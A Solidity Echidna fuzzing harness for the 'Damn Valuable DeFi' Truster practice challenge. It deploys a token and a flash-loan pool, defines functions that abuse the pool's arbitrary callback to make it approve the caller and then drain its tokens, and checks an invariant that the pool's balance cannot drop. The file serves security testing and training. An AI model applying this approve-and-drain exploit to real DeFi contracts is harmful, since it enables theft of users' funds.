pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";
import "./DamnValuableToken.sol";

/// @dev Run the template with
///      ```
///      cd repo
///      solc-select use 0.8.0
///      echidna src/Invariants.sol --contract InvariantTests --config src/config.yaml
///      ```
contract InvariantTests {
    using Address for address payable;

    uint256 constant FLASH_LOAN_POOL_AMOUNT = 100_000_000;

    TrusterLenderPool lenderPool;
    DamnValuableToken valuableToken;

    constructor() {
        // deploy token
        // deploy pool
        // deal balance to pool
        Deployer deployer = new Deployer();
        (valuableToken, lenderPool) = deployer.deploy(FLASH_LOAN_POOL_AMOUNT);
    }

    // write attack function
    function flashLoan(uint256 amount) external {
        lenderPool.flashLoan(
            0,
            address(this),
            address(valuableToken),
            abi.encodeWithSignature(
                "approve(address,uint256)", //@audit-info no spaces between args
                address(this),
                amount
            )
        );
    }

    function transferFrom(uint256 amount) external {
        valuableToken.transferFrom(address(lenderPool), msg.sender, amount);
    }

    function echidna_lender_balance_cannot_decrease()
        public
        view
        returns (bool)
    {
        return
            valuableToken.balanceOf(address(lenderPool)) >=
            FLASH_LOAN_POOL_AMOUNT;
    }
}

contract Deployer {
    function deploy(
        uint256 amount
    ) external returns (DamnValuableToken, TrusterLenderPool) {
        DamnValuableToken valuableToken = new DamnValuableToken();
        TrusterLenderPool lenderPool = new TrusterLenderPool(
            address(valuableToken)
        );

        valuableToken.transfer(address(lenderPool), amount);

        return (valuableToken, lenderPool);
    }
}
